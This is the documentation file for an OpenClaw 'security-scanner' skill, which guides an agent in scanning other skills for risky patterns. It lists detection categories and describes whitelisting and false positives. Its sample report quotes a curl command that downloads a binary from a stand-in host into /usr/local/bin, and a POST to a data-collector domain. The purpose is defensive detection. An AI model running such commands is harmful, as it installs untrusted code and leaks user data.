---
name: security-scanner
description: 在安装之前，会扫描 OpenClaw 的技能（skills）以检测安全漏洞和可疑模式。
author: anikrahman0
version: 2.0.0
tags: [security, scanner, malware-detection, safety, validation]
license: MIT
---
# 安全扫描器

## 说明

这是一个专注于安全性的工具，用于分析 OpenClaw 的 SKILL.md 文件和技能包，以检测潜在的安全风险、恶意模式和可疑行为。该工具通过以下方式帮助保护您的系统：
- 检测隐藏的外部下载或可执行文件
- 检测可疑的 API 调用和端点
- 检测危险的文件系统操作
- 检测混淆或编码的命令
- 检测不寻常的依赖项要求
- 检测已知的恶意模式

**为什么这很重要：** 该扫描器可以在安装前帮助您审查技能，通过标记潜在的可疑指令模式来确保系统的安全性。

## 特点

- ✅ **模式检测**：识别可疑的代码模式和行为
- ✅ **依赖项分析**：验证所需的依赖项和下载内容
- ✅ **API 端点验证**：检查可疑的外部连接
- ✅ **文件系统审计**：检测危险的文件操作
- ✅ **编码检测**：标记 Base64、十六进制等混淆尝试
- ✅ **风险评分**：分配风险等级（低、中、高、严重）
- ✅ **详细报告**：提供发现的详细解释
- ✅ **白名单支持**：配置受信任的域名和模式

## 工作原理

这是一个 OpenClaw 技能（而非独立的程序）。当您请求代理扫描一个技能文件时：
1. 代理会读取这个安全扫描器技能，以了解需要查找的模式
2. 代理会读取您想要扫描的技能文件
3. 代理会分析指令并报告发现的问题
4. 您需要手动审查被标记的项目

**注意：** 如果您更喜欢命令行使用，也可以直接使用包含的 `scanner.js` 文件（需 Node.js 18+ 版本支持）。

## 安装

通过 ClawHub 安装，或将其添加到您的 OpenClaw 技能目录中。

**命令行使用（可选）：**
```bash
# Clone the repository
git clone https://github.com/anikrahman0/security-skill-scanner.git
cd security-skill-scanner

# Run the scanner
node scanner.js path/to/SKILL.md
```

## 配置

在您的 OpenClaw 目录中创建一个 `.security-scanner-config.json` 文件（可选）：
```json
{
  "whitelistedDomains": [
    "github.com",
    "api.openai.com",
    "api.anthropic.com",
    "raw.githubusercontent.com"
  ],
  "whitelistedCommands": [
    "npm install",
    "pip install"
  ],
  "strictMode": false
}
```

## 使用方法

### 扫描 SKILL.md 文件
```
User: "Scan the skill file at ~/Downloads/new-skill/SKILL.md for security issues"
Agent: [Runs security scan and reports findings]
```

### 安装前扫描
```
User: "I have the email-automation skill file. Can you scan it for security risks?"
[User uploads the SKILL.md file]
Agent: [Reads and analyzes the skill file, provides risk assessment]
```

**重要提示：** 如果您让 Claude 从互联网下载技能，该下载步骤会使用网络连接（尽管扫描器本身是离线运行的）。

### 批量扫描所有已安装的技能
```
User: "Scan all my installed OpenClaw skills for security issues"
Agent: [Scans all skills in ~/.openclaw/skills/ and generates report]
```

## 检测内容

### 🔴 严重风险
- Shell 命令注入尝试
- 外部可执行文件下载（curl/wget 等工具）
- 可疑的 `eval()` 或 `exec()` 使用
- 证书收集行为
- 已知的恶意软件签名

### 🟠 高风险
- 未经验证的外部 API 调用
- 对敏感目录的文件系统写入权限
- Base64 或十六进制编码的命令
- 对未知域名的请求
- 权限提升尝试

### 🟡 中等风险
- 大范围的文件系统读取权限
- 未使用 HTTPS 的网络请求
- 过多的依赖项
- 不寻常的依赖项请求
- 已弃用或易受攻击的包

### 🟢 低风险
- 轻微的代码质量问题
- 缺少错误处理
- 文档不完整
- 非关键的警告

## ⚠️ 重要提示：误报与局限性

### 该扫描器可能会标记合法的模式

该扫描器使用的正则表达式模式可能会匹配合法的代码。**常见的误报包括：**
- ✗ **Markdown 中的反引号** - 使用反引号的代码示例
- ✗ **模板字符串** - 显示 `${variable}` 语法的文档
- ✗ **Base64 示例** - 演示编码/解码的技能
- ✗ **包管理器** - 合法的 `npm install` 或 `pip install` 命令
- ✗ **GitHub URL** - 链接到 `raw.githubusercontent.com` 的链接

### 实际扫描内容

技能文件实际上是 **Markdown 指令文件**，而非可执行代码。该扫描器：
- ✅ 读取技能文件的 Markdown 文本
- ✅ 查找可能令人担忧的指令模式
- ✅ 标记需要您手动审查的项目
- ❌ 不会扫描可执行的恶意软件（技能本身不是程序）
- ❌ 不会给出最终判断

### 您的责任

**您必须结合上下文审查所有被标记的项目。** 请问自己：
- 这种模式是否符合技能的用途？
- 作者是否可信？
- 指令是否清晰合理？

**如有疑问，请咨询技能作者或社区。**

## 输出格式
```
=== Security Scan Report ===
Skill: email-automation
Scanned: 2024-02-09 14:30:22
Overall Risk: HIGH ⚠️

FINDINGS:
[CRITICAL] External Binary Download Detected
  Location: Line 45 in prerequisites
  Pattern: curl https://unknown-site.com/tool -o /usr/local/bin/helper
  Risk: This downloads and executes an external binary from an untrusted source
  Recommendation: DO NOT INSTALL - Manual verification required

[HIGH] Suspicious API Endpoint
  Location: Line 89 in execute()
  Pattern: POST to http://data-collector.xyz/log
  Risk: Sends data to unknown third-party server
  Recommendation: Review what data is being sent

[MEDIUM] Unencrypted Network Request
  Location: Line 102
  Pattern: HTTP instead of HTTPS
  Risk: Data transmitted without encryption
  Recommendation: Request HTTPS version

SUMMARY:
Total Issues: 3
Critical: 1
High: 1
Medium: 1
Low: 0

RECOMMENDATION: ❌ DO NOT INSTALL
This skill has critical security issues that pose significant risk to your system.
```

## 示例场景

### 场景 1：安全的技能
```
User: "Scan the weather-checker skill"
Agent: "✅ SAFE - No security issues detected. The skill uses standard API calls
       to api.weatherapi.com with proper HTTPS and no file system access."
```

### 场景 2：可疑的技能
```
User: "Should I install the productivity-helper skill?"
Agent: "⚠️ WARNING - This skill attempts to download an external binary and
       makes requests to an unknown domain. Risk Level: CRITICAL
       Recommendation: DO NOT INSTALL"
```

### 场景 3：轻微问题
```
User: "Analyze the note-taker skill"
Agent: "⚠️ CAUTION - Risk Level: LOW
       Found 2 minor issues:
       - Uses HTTP instead of HTTPS for icon download
       - Missing input validation on file paths
       These can likely be fixed. Consider contacting the author."
```

## 安全保障

该扫描器本身在设计时考虑了安全性：
- ✅ **无网络访问**：扫描器本身完全离线运行（但如果您让 Claude 先下载技能文件，则会使用网络）
- ✅ **无外部依赖项**：仅使用纯 JavaScript/Node.js
- ✅ **只读**：从不修改被扫描的文件
- ✅ **无数据传输**：不向任何地方发送数据
- ✅ **开源**：所有代码均可审核
- ✅ **沙箱环境**：不会执行来自扫描技能的代码

## 误报

该扫描器可能会标记某些合法的模式。常见的误报包括：
- **npm/pip 安装**：合法的包管理器可能会触发警告
- **GitHub URL**：指向 `raw.githubusercontent.com` 的链接通常是安全的
- **配置文件**：修改配置文件的技能可能会被标记
- **日志文件**：创建日志文件可能会触发文件系统警告

请根据实际情况判断并审查被标记的项目。

## 局限性

- 无法检测零日漏洞或新型攻击方式
- 可能会遗漏复杂的混淆技术
- 需要人工判断来做出最终决定
- 无法扫描加密或编译后的代码
- 基于模式的检测可能存在误报

**此工具是一个有用的第一道防线，但不能替代仔细的审查。**

## 贡献

如果发现未被检测到的恶意模式，请提交问题或 Pull Request，提供以下信息：
- 恶意模式
- 使用该模式的示例技能
- 建议的检测方法

## 发展计划
- [ ] 基于机器学习的模式检测
- [ ] 与 VirusTotal API 集成（可选）
- [ ] 自动技能信誉检查
- [ ] 社区提供的恶意软件签名
- [ ] 为 ClawHub.ai 提供浏览器扩展
- [ ] 为技能开发者集成持续集成/持续部署（CI/CD）

## 支持

- 报告问题：https://github.com/anikrahman0/security-skill-scanner/issues
- 建议改进：欢迎提交 Pull Request
- 安全问题：a7604366@gmail.com

## 许可证

MIT 许可证 - 可以免费使用、修改和分发

## 免责声明

该工具提供基于模式的扫描服务，但可能存在误报。它扫描的是指令文件（Markdown），而非可执行代码。

**重要提示：** 该扫描器无法提供最终的安全判断。所有被标记的项目都需要结合上下文进行手动审查。技能只是供 Claude 读取的指令，而非自动执行的程序。

在安装任何技能之前，请务必仔细审查，尤其是那些需要系统级权限的技能。作者不对使用该工具或安装被扫描技能所导致的任何损害负责。

---

**记住：如果某个技能看起来过于完美或请求不寻常的权限，那么它很可能是可疑的。如有疑问，请不要安装它。**